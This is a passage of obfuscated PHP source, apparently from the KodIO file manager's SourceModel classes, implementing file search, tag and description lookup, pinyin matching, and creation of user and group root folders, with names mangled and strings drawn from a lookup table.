[2083])->where($Û°¢¨)->join($âëçÂ×«, $ä”“› [2084])->sum($ä”“› [86]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($ªôïüÅÀ) { $÷‹Å±Æâ =& $_SERVER[ñ÷§¡å]; $šŞßµüğ = KodIO::fileTypeList(); $ä®‡ÁŠ­ = $šŞßµüğ[$ªôïüÅÀ]; if (!$ä®‡ÁŠ­) { return array(); } $ñÖì–¿» = $ä®‡ÁŠ­[$÷‹Å±Æâ[184]]; $÷æõÊ¢ç = $÷‹Å±Æâ[7]; if (!$ä®‡ÁŠ­[$÷‹Å±Æâ[184]]) { $÷ãˆò“ = array_to_keyvalue($šŞßµüğ, $÷‹Å±Æâ[12], $÷‹Å±Æâ[184]); $ñÖì–¿» = implode($÷‹Å±Æâ[50], $÷ãˆò“); $÷æõÊ¢ç = $÷‹Å±Æâ[2086]; } $•Ì¡âÁ = explode($÷‹Å±Æâ[50], trim($ñÖì–¿», $÷‹Å±Æâ[50])); return array($÷æõÊ¢ç, $•Ì¡âÁ); } public function listPathType($ÙÃ„¦) { $¼îîèÜ… =& $_SERVER[ñ÷§¡å]; $ÒØ†ıÔ  = $this->fileTypeWhere($ÙÃ„¦); if (!$ÒØ†ıÔ ) { return array(); } $üıüĞõæ = USER_ID; $¡‰ˆ¬­¼ = Model($¼îîèÜ…[544])->getInfo($üıüĞõæ); $÷ßŸÜ²¸ = array($¼îîèÜ…[595] => SourceModel::TYPE_USER, $¼îîèÜ…[530] => array($¼îîèÜ…[559], $¼îîèÜ…[540] . $¡‰ˆ¬­¼[$¼îîèÜ…[96]][$¼îîèÜ…[411]] . $¼îîèÜ…[560]), $¼îîèÜ…[596] => $üıüĞõæ, $¼îîèÜ…[592] => 0, $¼îîèÜ…[593] => $ÒØ†ıÔ ); return $this->listSource($÷ßŸÜ²¸); } public function listSearch($±¨ÚÛÔ, $ñï…ğÂ§ = 300) { $öØÌØã¶ =& $_SERVER[ñ÷§¡å]; if (isset($±¨ÚÛÔ[$öØÌØã¶[1929]]) && $±¨ÚÛÔ[$öØÌØã¶[1929]]) { $±¨ÚÛÔ[$öØÌØã¶[1929]] = str_replace($öØÌØã¶[393], $öØÌØã¶[2087], trim($±¨ÚÛÔ[$öØÌØã¶[1929]])); } $­µ¯ê° = $this->_parseSearchWhere($±¨ÚÛÔ); if (!isset($­µ¯ê°[$öØÌØã¶[440]])) { $­µ¯ê°[$öØÌØã¶[440]] = 0; } $†Ì‹®¥ = $öØÌØã¶[2088]; $ûÛ³äÌ¹ = $­µ¯ê°; $ËŠËŠÈ² = $†Ì‹®¥; $this->_listSearchBindPinyin($±¨ÚÛÔ, $­µ¯ê°, $†Ì‹®¥); $this->alias($öØÌØã¶[455])->_makeOrder(); $­µ¯ê° = $this->parseWhereLike($­µ¯ê°); $ìŒÏ‚» = $this->distinct(!0)->field($†Ì‹®¥)->where($­µ¯ê°)->selectPage($ñï…ğÂ§); if ($GLOBALS[$öØÌØã¶[6]][$öØÌØã¶[390]][$öØÌØã¶[391]] && Input::check($±¨ÚÛÔ[$öØÌØã¶[1929]], $öØÌØã¶[602]) && $ìŒÏ‚»[$öØÌØã¶[375]][$öØÌØã¶[362]] == 1 && $ìŒÏ‚»[$öØÌØã¶[375]][$öØÌØã¶[376]] == 0) { $ìŒÏ‚» = $this->distinct(!0)->field($†Ì‹®¥)->where($ûÛ³äÌ¹)->limit(1000)->select(); $ìŒÏ‚» = array_page_split($ìŒÏ‚», !1, $ñï…ğÂ§); } $this->_listSearchFileContent($ìŒÏ‚», $±¨ÚÛÔ, $ËŠËŠÈ², $ûÛ³äÌ¹); $this->_listSearchDesc($ìŒÏ‚», $±¨ÚÛÔ, $ËŠËŠÈ²); $this->_listSearchTag($ìŒÏ‚», $±¨ÚÛÔ, $ËŠËŠÈ²); $this->_listSearchGroupTag($ìŒÏ‚», $±¨ÚÛÔ, $ËŠËŠÈ²); $this->_listDataApply($ìŒÏ‚»[$öØÌØã¶[378]]); $this->_listMake($ìŒÏ‚»); return $ìŒÏ‚»; } private function _listSearchFileContent(&$¶¶èÚåÊ, $·ÀÊ×ÎÍ, $·±Û°©, $Û·±¬ü™) { $î–§¢§ =& $_SERVER[ñ÷§¡å]; if (!$·ÀÊ×ÎÍ[$î–§¢§[1929]] || $¶¶èÚåÊ[$î–§¢§[375]][$î–§¢§[362]] > 1) { return; } if (!isset($Û·±¬ü™[$î–§¢§[32]]) || !is_array($·ÀÊ×ÎÍ[$î–§¢§[477]])) { return; } $Û·±¬ü™[$î–§¢§[477]] = array($î–§¢§[7], $·ÀÊ×ÎÍ[$î–§¢§[477]]); unset($Û·±¬ü™[$î–§¢§[32]]); unset($·ÀÊ×ÎÍ[$î–§¢§[477]]); $ë‘úğ–Ê = $this->field($·±Û°©)->where($Û·±¬ü™)->limit($î–§¢§[2089])->select(); if (!$ë‘úğ–Ê || count($ë‘úğ–Ê) == 0) { return; } $¶¶èÚåÊ[$î–§¢§[378]] = array_merge($ë‘úğ–Ê, $¶¶èÚåÊ[$î–§¢§[378]]); $¶¶èÚåÊ[$î–§¢§[375]][$î–§¢§[376]] += count($ë‘úğ–Ê); } private function _listSearchTag(&$¸ïœøƒ›, $“ë“Îúò, $“Åõ¶Ä) { $×Å£õ¾õ =& $_SERVER[ñ÷§¡å]; if (!$“ë“Îúò[$×Å£õ¾õ[1929]] || $¸ïœøƒ›[$×Å£õ¾õ[375]][$×Å£õ¾õ[362]] > 1) { return; } $«çéÖ‹ = Model($×Å£õ¾õ[2090])->listData(); $ÃÜ±ì× = array(); $…ºêÓÇ = $“ë“Îúò[$×Å£õ¾õ[1929]]; foreach ($«çéÖ‹ as $µ‹¶˜şó) { $ƒÃÒú¶Õ = $µ‹¶˜şó[$×Å£õ¾õ[32]]; $×Úñ…ÁÙ = str_replace($×Å£õ¾õ[53], $×Å£õ¾õ[12], Pinyin::get($ƒÃÒú¶Õ)); if (stripos($ƒÃÒú¶Õ, $…ºêÓÇ) !== !1 || stripos($×Úñ…ÁÙ, $…ºêÓÇ) !== !1) { $ÃÜ±ì×[] = $µ‹¶˜şó[$×Å£õ¾õ[408]]; } } if (!$ÃÜ±ì×) { return; } $Á—ÎÉôË = array($×Å£õ¾õ[435] => array($×Å£õ¾õ[7], $ÃÜ±ì×), $×Å£õ¾õ[1663] => USER_ID); $ß›Ù•¼Ÿ = Model($×Å£õ¾õ[437])->field($×Å£õ¾õ[94])->where($Á—ÎÉôË)->select(); $ß›Ù•¼Ÿ = array_to_keyvalue($ß›Ù•¼Ÿ, $×Å£õ¾õ[12], $×Å£õ¾õ[94]); $Í†ó½¿« = array_unique($ß›Ù•¼Ÿ); $this->_listSearchMerge($¸ïœøƒ›, $“ë“Îúò, $“Åõ¶Ä, $Í†ó½¿«); } private function _listSearchDesc(&$Ö¥…†•, $®‹ÃÇ•ô, $Ç«ƒ¿„Ğ) { $±ü‡Å’ƒ =& $_SERVER[ñ÷§¡å]; if (!$®‹ÃÇ•ô[$±ü‡Å’ƒ[1929]] || $Ö¥…†•[$±ü‡Å’ƒ[375]][$±ü‡Å’ƒ[362]] > 1) { return; } $Êş¯ìÂ€ = array($±ü‡Å’ƒ[104] => $±ü‡Å’ƒ[462], $±ü‡Å’ƒ[383] => array($±ü‡Å’ƒ[392], $±ü‡Å’ƒ[1931] . $®‹ÃÇ•ô[$±ü‡Å’ƒ[1929]] . $±ü‡Å’ƒ[1931])); $•Ôïß¨¬ = !1; if ($•Ôïß¨¬) { $ÙüÙ‹†Â = $this->listSearchChildren($®‹ÃÇ•ô[$±ü‡Å’ƒ[441]]); $ÙüÙ‹†Â = array_unique($ÙüÙ‹†Â); if (!$ÙüÙ‹†Â) { return; } $Êş¯ìÂ€[$±ü‡Å’ƒ[411]] = array($±ü‡Å’ƒ[7], $ÙüÙ‹†Â); } $´Öæó” = Model($±ü‡Å’ƒ[578])->field($±ü‡Å’ƒ[411])->where($Êş¯ìÂ€)->limit(5000)->select(); $şáèş» = array_to_keyvalue($´Öæó”, $±ü‡Å’ƒ[12], $±ü‡Å’ƒ[411]); $this->_listSearchMerge($Ö¥…†•, $®‹ÃÇ•ô, $Ç«ƒ¿„Ğ, $şáèş»); } private function _listSearchGroupTag(&$ë‘Õ„‹‡, $¡•Š—õ, $š¡Ã‘Èê) { $Æ”‰·¢Õ =& $_SERVER[ñ÷§¡å]; if (!$¡•Š—õ[$Æ”‰·¢Õ[1929]] || $ë‘Õ„‹‡[$Æ”‰·¢Õ[375]][$Æ”‰·¢Õ[362]] > 1 || !$¡•Š—õ[$Æ”‰·¢Õ[441]]) { return; } $ƒ¸ôƒğ€ = $this->sourceInfo($¡•Š—õ[$Æ”‰·¢Õ[441]]); if (!$ƒ¸ôƒğ€ || $ƒ¸ôƒğ€[$Æ”‰·¢Õ[420]] != SourceModel::TYPE_GROUP) { return; } $Çò´›Æø = $ƒ¸ôƒğ€[$Æ”‰·¢Õ[514]]; $öìàÁ° = Model($Æ”‰·¢Õ[2091])->get($Çò´›Æø); $‘´Ø‚ = array(); $å¸—“¨ğ = $¡•Š—õ[$Æ”‰·¢Õ[1929]]; foreach ($öìàÁ°[$Æ”‰·¢Õ[378]] as $Î’òƒ…Ğ) { $¼„Ê‚ãĞ = $Î’òƒ…Ğ[$Æ”‰·¢Õ[32]]; $ç™ ‹¦ = str_replace($Æ”‰·¢Õ[53], $Æ”‰·¢Õ[12], Pinyin::get($¼„Ê‚ãĞ)); if (stripos($¼„Ê‚ãĞ, $å¸—“¨ğ) !== !1 || stripos($ç™ ‹¦, $å¸—“¨ğ) !== !1) { $‘´Ø‚[] = $Î’òƒ…Ğ[$Æ”‰·¢Õ[408]]; } } if (!$‘´Ø‚) { return; } $»Èéïî = array($Æ”‰·¢Õ[435] => array($Æ”‰·¢Õ[7], $‘´Ø‚), $Æ”‰·¢Õ[1663] => 0, $Æ”‰·¢Õ[33] => $Æ”‰·¢Õ[1951] . $Çò´›Æø); $È«‚¯³ = Model($Æ”‰·¢Õ[437])->field($Æ”‰·¢Õ[94])->where($»Èéïî)->select(); $È«‚¯³ = array_to_keyvalue($È«‚¯³, $Æ”‰·¢Õ[12], $Æ”‰·¢Õ[94]); $Ñ¼åá­ı = array_unique($È«‚¯³); $this->_listSearchMerge($ë‘Õ„‹‡, $¡•Š—õ, $š¡Ã‘Èê, $Ñ¼åá­ı); } private function _listSearchMerge(&$­‹²ÓË„, $Ã„ıˆÍÙ, $ã»ˆ¤Å, $Â–¿«ºÒ) { $¦‡µÅ› =& $_SERVER[ñ÷§¡å]; if (!$Â–¿«ºÒ) { return; } $ĞÖ˜ÌÂ‚ = array_to_keyvalue($­‹²ÓË„[$¦‡µÅ›[378]], $¦‡µÅ›[12], $¦‡µÅ›[411]); $¬ƒÃÜÕÑ = array_diff($Â–¿«ºÒ, $ĞÖ˜ÌÂ‚); if (!$¬ƒÃÜÕÑ) { return; } $éŒï±‹ = array($¦‡µÅ›[411] => array($¦‡µÅ›[7], $¬ƒÃÜÕÑ)); $ªáœ‡Â = $this->field($ã»ˆ¤Å)->where($éŒï±‹)->select(); if (!$ªáœ‡Â) { return; } $¹ÂüŒô = array(); foreach ($ªáœ‡Â as $…‚Ïƒ¯ƒ) { if ($this->_listSearchFilter($…‚Ïƒ¯ƒ, $Ã„ıˆÍÙ)) { $¹ÂüŒô[] = $…‚Ïƒ¯ƒ; } } $­‹²ÓË„[$¦‡µÅ›[378]] = array_merge($¹ÂüŒô, $­‹²ÓË„[$¦‡µÅ›[378]]); $­‹²ÓË„[$¦‡µÅ›[375]][$¦‡µÅ›[376]] += count($¹ÂüŒô); } private function _listSearchFilter($ã¦‚ó¶İ, $¥ò Ò—±) { $À³£ÛÚì =& $_SERVER[ñ÷§¡å]; $á’åø¿¦ = $ã¦‚ó¶İ[$À³£ÛÚì[419]] == $À³£ÛÚì[98]; if (!strstr($ã¦‚ó¶İ[$À³£ÛÚì[530]], $À³£ÛÚì[50] . $¥ò Ò—±[$À³£ÛÚì[441]] . $À³£ÛÚì[50])) { return !1; } if (isset($¥ò Ò—±[$À³£ÛÚì[421]]) && $¥ò Ò—±[$À³£ÛÚì[421]] != $À³£ÛÚì[1890]) { if ($¥ò Ò—±[$À³£ÛÚì[421]] == $À³£ÛÚì[85] && !$á’åø¿¦) { return !1; } if ($¥ò Ò—±[$À³£ÛÚì[421]] != $À³£ÛÚì[85] && $á’åø¿¦) { return !1; } if (!strstr($ã¦‚ó¶İ[$À³£ÛÚì[184]], $À³£ÛÚì[50] . $¥ò Ò—±[$À³£ÛÚì[421]] . $À³£ÛÚì[50])) { return !1; } } if (isset($¥ò Ò—±[$À³£ÛÚì[2092]]) && $¥ò Ò—±[$À³£ÛÚì[2092]] < $ã¦‚ó¶İ[$À³£ÛÚì[86]]) { return !1; } if (isset($¥ò Ò—±[$À³£ÛÚì[2093]]) && $¥ò Ò—±[$À³£ÛÚì[2093]] > $ã¦‚ó¶İ[$À³£ÛÚì[86]]) { return !1; } if (isset($¥ò Ò—±[$À³£ÛÚì[609]]) && $¥ò Ò—±[$À³£ÛÚì[609]] != $ã¦‚ó¶İ[$À³£ÛÚì[465]]) { return !1; } return !0; } public function listSearchChildren($§¿ á°Ô, $İÊ•Œ› = 5000) { $€à»ˆáö =& $_SERVER[ñ÷§¡å]; $ÍæÜŠ±‚ = array(); $Ò¬È Í = $this->sourceInfo($§¿ á°Ô); $µóæ«•î = array($€à»ˆáö[530] => array($€à»ˆáö[392], $Ò¬È Í[$€à»ˆáö[530]] . $Ò¬È Í[$€à»ˆáö[411]] . $€à»ˆáö[560])); $û¥Ñğµ£ = $this->field($€à»ˆáö[86])->where($µóæ«•î)->limit($İÊ•Œ› + 1)->select(); $ŸŸàÅ´Î = is_array($û¥Ñğµ£) ? count($û¥Ñğµ£) : 0; if ($ŸŸàÅ´Î > $İÊ•Œ›) { return $this->_listSearchChildrenNear($§¿ á°Ô, $İÊ•Œ›); } $¥ÙÇ‡å£ = $this->field($€à»ˆáö[411])->where($µóæ«•î)->select(); $ÍæÜŠ±‚ = array_to_keyvalue($¥ÙÇ‡å£, $€à»ˆáö[12], $€à»ˆáö[411]); return $ÍæÜŠ±‚; } private function _listSearchChildrenNear($»ÌÔ ù, $È€È«ı) { $£ôã§Ø§ =& $_SERVER[ñ÷§¡å]; $Ÿ†¡¦ = array(); $Ò¿á…ˆ› = array($£ôã§Ø§[441] => $»ÌÔ ù); $Ó‚óˆ”æ = $this->field($£ôã§Ø§[2094])->where($Ò¿á…ˆ›)->select(); $ËêŞ½Ã = array_to_keyvalue(array_filter_by_field($Ó‚óˆ”æ, $£ôã§Ø§[419], $£ôã§Ø§[98]), $£ôã§Ø§[12], $£ôã§Ø§[411]); $Ÿ†¡¦ = array_merge($Ÿ†¡¦, array_to_keyvalue($Ó‚óˆ”æ, $£ôã§Ø§[12], $£ôã§Ø§[411])); if (!$ËêŞ½Ã) { return $Ÿ†¡¦; } $Ò¿á…ˆ› = array($£ôã§Ø§[441] => array($£ôã§Ø§[7], $ËêŞ½Ã)); $Ó‚óˆ”æ = $this->field($£ôã§Ø§[2094])->where($Ò¿á…ˆ›)->limit($È€È«ı)->select(); $Ÿ†¡¦ = array_merge($Ÿ†¡¦, array_to_keyvalue($Ó‚óˆ”æ, $£ôã§Ø§[12], $£ôã§Ø§[411])); $Ÿ†¡¦ = array_slice($Ÿ†¡¦, 0, $È€È«ı); return $Ÿ†¡¦; } private function _listSearchBindPinyin($öû²À™«, &$ô£ìœœš, &$÷«Šæ§ä) { $‰…Ê¯Áé =& $_SERVER[ñ÷§¡å]; if (!isset($öû²À™«[$‰…Ê¯Áé[1929]]) || !$öû²À™«[$‰…Ê¯Áé[1929]]) { return; } if (!Input::check($öû²À™«[$‰…Ê¯Áé[1929]], $‰…Ê¯Áé[327]) || strlen($öû²À™«[$‰…Ê¯Áé[1929]]) < 2) { return; } $ ğ‰Ù†½ = "\114\105\x46\124\40\x4a\117\111\116\40{$this->tablePrefix}\151\x6f\x5f\x73\157\x75\162\x63\x65\137\x6d\145\x74\x61\x20\x6d\x65\164\x61\40\157\156\40\163\157\165\162\143\x65\56\163\157\x75\162\143\145\x49\x44\x20\x3d\x20\155\145\164\x61\56\x73\157\x75\162\143\x65\x49\104"; $èşèÈÛö = array(); $÷«Šæ§ä = str_replace(array($‰…Ê¯Áé[65], $‰…Ê¯Áé[53], $‰…Ê¯Áé[2095]), $‰…Ê¯Áé[12], $÷«Šæ§ä); $÷«Šæ§ä = $‰…Ê¯Áé[447] . str_replace($‰…Ê¯Áé[50], $‰…Ê¯Áé[448], $÷«Šæ§ä); $‰›ôëéœ = $ô£ìœœš[$‰…Ê¯Áé[32]]; unset($ô£ìœœš[$‰…Ê¯Áé[32]]); foreach ($ô£ìœœš as $À¿•¨•İ => $“‹Ä•®) { $èşèÈÛö[$‰…Ê¯Áé[447] . $À¿•¨•İ] = $“‹Ä•®; } foreach ($‰›ôëéœ as $Ôßû‘Ó³) { $èşèÈÛö[] = array($‰…Ê¯Áé[452] => $Ôßû‘Ó³, $‰…Ê¯Áé[1007] => $‰…Ê¯Áé[1933], array($‰…Ê¯Áé[2096] => $Ôßû‘Ó³, $‰…Ê¯Áé[2097] => array($‰…Ê¯Áé[7], array($‰…Ê¯Áé[474], $‰…Ê¯Áé[473])))); } $this->join($ ğ‰Ù†½); $ô£ìœœš = $èşèÈÛö; } private function _parseSearchWhere($ËçĞÒ®ó) { $Â»»ãÇ =& $_SERVER[ñ÷§¡å]; $À°Ô¬ù¦ = array(); if (isset($ËçĞÒ®ó[$Â»»ãÇ[774]]) && $ËçĞÒ®ó[$Â»»ãÇ[774]]) { $À°Ô¬ù¦[$Â»»ãÇ[95]] = array($Â»»ãÇ[2098], $ËçĞÒ®ó[$Â»»ãÇ[774]]); } if (isset($ËçĞÒ®ó[$Â»»ãÇ[506]]) && $ËçĞÒ®ó[$Â»»ãÇ[506]]) { $ÙÄˆ¯İ = array($Â»»ãÇ[2099], $ËçĞÒ®ó[$Â»»ãÇ[506]]); if ($À°Ô¬ù¦[$Â»»ãÇ[95]]) { $À°Ô¬ù¦[$Â»»ãÇ[95]] = array($À°Ô¬ù¦[$Â»»ãÇ[95]], $ÙÄˆ¯İ, $Â»»ãÇ[2100]); } else { $À°Ô¬ù¦[$Â»»ãÇ[95]] = $ÙÄˆ¯İ; } } if (isset($ËçĞÒ®ó[$Â»»ãÇ[2092]]) && $ËçĞÒ®ó[$Â»»ãÇ[2092]] > 0) { $À°Ô¬ù¦[$Â»»ãÇ[86]] = array($Â»»ãÇ[2098], $ËçĞÒ®ó[$Â»»ãÇ[2092]]); } if (isset($ËçĞÒ®ó[$Â»»ãÇ[2093]]) && $ËçĞÒ®ó[$Â»»ãÇ[2093]]) { $ÙÄˆ¯İ = array($Â»»ãÇ[2099], $ËçĞÒ®ó[$Â»»ãÇ[2093]]); if ($À°Ô¬ù¦[$Â»»ãÇ[86]]) { $À°Ô¬ù¦[$Â»»ãÇ[86]] = array($À°Ô¬ù¦[$Â»»ãÇ[86]], $ÙÄˆ¯İ, $Â»»ãÇ[2100]); } else { $À°Ô¬ù¦[$Â»»ãÇ[86]] = $ÙÄˆ¯İ; } } if (isset($ËçĞÒ®ó[$Â»»ãÇ[609]]) && $ËçĞÒ®ó[$Â»»ãÇ[609]]) { $À°Ô¬ù¦[] = array($Â»»ãÇ[465] => $ËçĞÒ®ó[$Â»»ãÇ[609]], $Â»»ãÇ[463] => $ËçĞÒ®ó[$Â»»ãÇ[609]], $Â»»ãÇ[1007] => $Â»»ãÇ[1933]); } if (isset($ËçĞÒ®ó[$Â»»ãÇ[421]]) && $ËçĞÒ®ó[$Â»»ãÇ[421]]) { $È˜Åç­Ï = $ËçĞÒ®ó[$Â»»ãÇ[421]]; if ($È˜Åç­Ï == $Â»»ãÇ[85]) { $À°Ô¬ù¦[$Â»»ãÇ[419]] = 1; } else { if ($È˜Åç­Ï == $Â»»ãÇ[2101]) { $À°Ô¬ù¦[$Â»»ãÇ[419]] = 0; } else { if ($È˜Åç­Ï) { $È˜Åç­Ï = is_array($È˜Åç­Ï) ? $È˜Åç­Ï : explode($Â»»ãÇ[50], $È˜Åç­Ï); $À°Ô¬ù¦[$Â»»ãÇ[421]] = array($Â»»ãÇ[427], $È˜Åç­Ï); $À°Ô¬ù¦[$Â»»ãÇ[419]] = 0; } } } } $this->_parseSearchParent($ËçĞÒ®ó, $À°Ô¬ù¦); if (isset($ËçĞÒ®ó[$Â»»ãÇ[1929]]) && trim($ËçĞÒ®ó[$Â»»ãÇ[1929]])) { $Å‚¯ÏËß = trim($ËçĞÒ®ó[$Â»»ãÇ[1929]]); $¬Ëôæïø = explode($Â»»ãÇ[53], $Å‚¯ÏËß); if (strlen($Å‚¯ÏËß) > 2 && (substr($Å‚¯ÏËß, 0, 1) == $Â»»ãÇ[128] && substr($Å‚¯ÏËß, -1) == $Â»»ãÇ[128]) || substr($Å‚¯ÏËß, 0, 1) == $Â»»ãÇ[58] && substr($Å‚¯ÏËß, -1) == $Â»»ãÇ[58]) { $Å‚¯ÏËß = substr($Å‚¯ÏËß, 1, -1); $¬Ëôæïø = array($Å‚¯ÏËß); } $À°Ô¬ù¦[$Â»»ãÇ[32]] = array(array($Â»»ãÇ[559], $Â»»ãÇ[1931] . $Å‚¯ÏËß . $Â»»ãÇ[1931])); if (count($¬Ëôæïø) > 1) { $À°Ô¬ù¦[$Â»»ãÇ[32]] = array(); foreach ($¬Ëôæïø as $´€ú‰ù) { if (!trim($´€ú‰ù)) { continue; } $À°Ô¬ù¦[$Â»»ãÇ[32]][] = array($Â»»ãÇ[559], $Â»»ãÇ[1931] . trim($´€ú‰ù) . $Â»»ãÇ[1931]); } } } return $À°Ô¬ù¦; } private function _parseSearchParent($ßÃÂó¬Ì, &$÷Şàù­) { $—÷£å÷¤ =& $_SERVER[ñ÷§¡å]; if (!isset($ßÃÂó¬Ì[$—÷£å÷¤[441]]) || !$ßÃÂó¬Ì[$—÷£å÷¤[441]]) { return; } $ì•ıŒÊß = $this->pathInfo($ßÃÂó¬Ì[$—÷£å÷¤[441]]); $€¹ëíÌ‚ = $ì•ıŒÊß[$—÷£å÷¤[441]] . $—÷£å÷¤[12] === $—÷£å÷¤[207]; $Œß‰îµó = $ì•ıŒÊß[$—÷£å÷¤[420]] == $—÷£å÷¤[524]; if ($ì•ıŒÊß[$—÷£å÷¤[541]] == $—÷£å÷¤[542]) { $óÌ²’œî = $this->sourceInfo($ßÃÂó¬Ì[$—÷£å÷¤[441]]); $ì•ıŒÊß[$—÷£å÷¤[530]] = $óÌ²’œî[$—÷£å÷¤[530]]; } $÷Şàù­[$—÷£å÷¤[599]] = array($—÷£å÷¤[559], $ì•ıŒÊß[$—÷£å÷¤[530]] . $ßÃÂó¬Ì[$—÷£å÷¤[441]] . $—÷£å÷¤[560]); $µ·Ÿ÷Í = isset($ßÃÂó¬Ì[$—÷£å÷¤[1794]]) && in_array($—÷£å÷¤[524], $ßÃÂó¬Ì[$—÷£å÷¤[1794]]); if (!$µ·Ÿ÷Í || !$Œß‰îµó || !$€¹ëíÌ‚ || !$ì•ıŒÊß[$—÷£å÷¤[422]]) { return; } if (!AuthModel::authCheckRoot($ì•ıŒÊß[$—÷£å÷¤[422]][$—÷£å÷¤[423]])) { return; } $¦Ş±Ö†Ú = $ì•ıŒÊß[$—÷£å÷¤[514]] . $—÷£å÷¤[12]; if ($¦Ş±Ö†Ú == $—÷£å÷¤[98]) { unset($÷Şàù­[$—÷£å÷¤[599]]); $÷Şàù­[$—÷£å÷¤[420]] = self::TYPE_GROUP; return; } $º×«†± = Model($—÷£å÷¤[531])->groupChildrenAll($¦Ş±Ö†Ú); $…ø¬ãœÊ = count($º×«†±); if ($…ø¬ãœÊ <= 1) { return; } $…ÀÌè™â = array($—÷£å÷¤[441] => 0, $—÷£å÷¤[420] => self::TYPE_GROUP, $—÷£å÷¤[514] => array($—÷£å÷¤[7], $º×«†±)); $¥ÙÔ• = $this->field($—÷£å÷¤[2102])->where($…ÀÌè™â)->limit($…ø¬ãœÊ)->select(); $÷Şàù­[$—÷£å÷¤[599]] = array(); foreach ($¥ÙÔ• as $ÊóÉö›Õ) { $÷Şàù­[$—÷£å÷¤[599]][] = array($—÷£å÷¤[559], $—÷£å÷¤[540] . $ÊóÉö›Õ[$—÷£å÷¤[411]] . $—÷£å÷¤[560]); } $÷Şàù­[$—÷£å÷¤[599]][] = $—÷£å÷¤[1933]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($ï…ª¤¸İ) { $åƒ÷‡ÎÑ =& $_SERVER[ñ÷§¡å]; $Û³œåÚò = Model($åƒ÷‡ÎÑ[522])->where(array($åƒ÷‡ÎÑ[1654] => $ï…ª¤¸İ))->find(); $ÃØê¦ˆŒ = $this->_mkdirRoot(SourceModel::TYPE_USER, $ï…ª¤¸İ, $Û³œåÚò[$åƒ÷‡ÎÑ[32]]); $this->userDesktopAdd($ÃØê¦ˆŒ); return $ÃØê¦ˆŒ; } public function userDesktopAdd($Á¢¨•Ù”) { $ê­¡§Ó¼ =& $_SERVER[ñ÷§¡å]; $úâãŠöŞ = LNG($ê­¡§Ó¼[2103]); $ûÅëÛØ× = $this->mkdir($Á¢¨•Ù”, $úâãŠöŞ); $this->metaSet($ûÅëÛØ×, $ê­¡§Ó¼[2104], $ê­¡§Ó¼[98]); $this->metaSet($Á¢¨•Ù”, $ê­¡§Ó¼[2105], $ûÅëÛØ×); } public function userPathSafeAdd($Š»ƒñ§É) { $áÄáëß¿ =& $_SERVER[ñ÷§¡å]; $İİ“° = Model($áÄáëß¿[522])->getInfoFull($Š»ƒñ§É); if (!$İİ“°) { return !1; } if (_get($İİ“°, $áÄáëß¿[545])) { return $İİ“°[$áÄáëß¿[475]][$áÄáëß¿[2106]]; } $˜¿ÕÁ‘À = $this->_mkdirRoot(SourceModel::TYPE_USER, $Š»ƒñ§É, $áÄáëß¿[2107], $áÄáëß¿[442]); Model($áÄáëß¿[522])->metaSet($Š»ƒñ§É, $áÄáëß¿[2106], $˜¿ÕÁ‘À); $this->metaSet($˜¿ÕÁ‘À, $áÄáëß¿[2108], $Š»ƒñ§É); return $˜¿ÕÁ‘À; } public function groupRootAdd($ÓÅ´øˆ°) { $ã™ÑÁó =& $_SERVER[ñ÷§¡å]; $¤àÃ¿œí = Model($ã™ÑÁó[531])->where(array($ã™ÑÁó[1923] => $ÓÅ´øˆ°))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $ÓÅ´øˆ°, $¤àÃ¿œí[$ã™ÑÁó[32]]); } public function systemRootPathAdd($‚ÛÎ›”) { if ($‚ÛÎ›” != $_SERVER[ñ÷§¡å][553]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $‚ÛÎ›”); } public function userRootRemove($“İÒ®Õ) { $ÜŠôıŸ = $this->sourceRoot(SourceModel::TYPE_USER, $“İÒ®Õ, !0); foreach ($ÜŠôıŸ as $–ŒåæİÅ) { if (!$–ŒåæİÅ) { continue; } $this->remove($–ŒåæİÅ[$_SERVER[ñ÷§¡å][411]], !1); } } public function groupRootRemove($õ¶ºüÑ) { $á“Î›½ì = $this->sourceRoot(SourceModel::TYPE_GROUP, $õ¶ºüÑ); if (!$á“Î›½ì) { return; } $this->remove($á“Î›½ì[$_SERVER[ñ÷§¡å][411]], !1); } private function _mkdirRoot($ÜïçÃÛ‹, $ÄÖÄ©Ï, $§¶…±¬÷, $²çüéòÜ = '') { $øçá‡²ã =& $_SERVER[ñ÷§¡å]; $’Ë¹İÚı = array($øçá‡²ã[410] => 0, $øçá‡²ã[595] => $ÜïçÃÛ‹, $øçá‡²ã[596] => $ÄÖÄ©Ï, $øçá‡²ã[592] => 1, $øçá‡²ã[597] => USER_ID, $øçá‡²ã[598] => USER_ID, $øçá‡²ã[593] => $²çüéòÜ, $øçá‡²ã[599] => $øçá‡²ã[540], $øçá‡²ã[439] => 0, $øçá‡²ã[594] => 0, $øçá‡²ã[478] => 0, $øçá‡²ã[600] => $øçá‡²ã[12]); if ($Ü§ÌÌƒ– = $this->where($’Ë¹İÚı)->find()) { return $Ü§ÌÌƒ–[$øçá‡²ã[411]]; } $±şšâ‡š = "\x4d\x6f\x64\x65\x6c\x53\157\165\162\x63\x65\x2e\x6d\153\x64\151\x72\x52\x6f\157\x74\x2e{$ÜïçÃÛ‹}\56{$ÄÖÄ©Ï}\x2e" . $§¶…±¬÷; CacheLock::lock($±şšâ‡š); $’Ë¹İÚı[$øçá‡²ã[32]] = $§¶…±¬÷; $¤ƒ¡˜Ñ­ = $this->add($’Ë¹İÚı); $°œÍõÆ = array($øçá‡²ã[601] => short_id($¤ƒ¡˜Ñ­)); $this->where(array($øçá‡²ã[426] => $¤ƒ¡˜Ñ­))->save($°œÍõÆ); CacheLock::unlock($±şšâ‡š); return $¤ƒ¡˜Ñ­; } private function sourceRoot($ùÎÙÚ‹ğ, $ó™¶¹¶Ì, $øæñÜ¥ã = false) { $‘™Ş¾õ£ =& $_SERVER[ñ÷§¡å]; $¬­Ëº– = array($‘™Ş¾õ£[410] => 0, $‘™Ş¾õ£[595] => $ùÎÙÚ‹ğ, $‘™Ş¾õ£[596] => $ó™¶¹¶Ì); if ($øæñÜ¥ã) { $Ÿ‹şó‘û = $this->where($¬­Ëº–)->select(); return $Ÿ‹şó‘û ? $Ÿ‹şó‘û : array(); } $§½ÏÈ±ø = $this->where($¬­Ëº–)->find(); return $§½ÏÈ±ø ? $§½ÏÈ±ø : array(); } public function sourceRootGroup($ò‹³ÙÅ–) { $–‡øšçí =& $_SERVER[ñ÷§¡å]; if 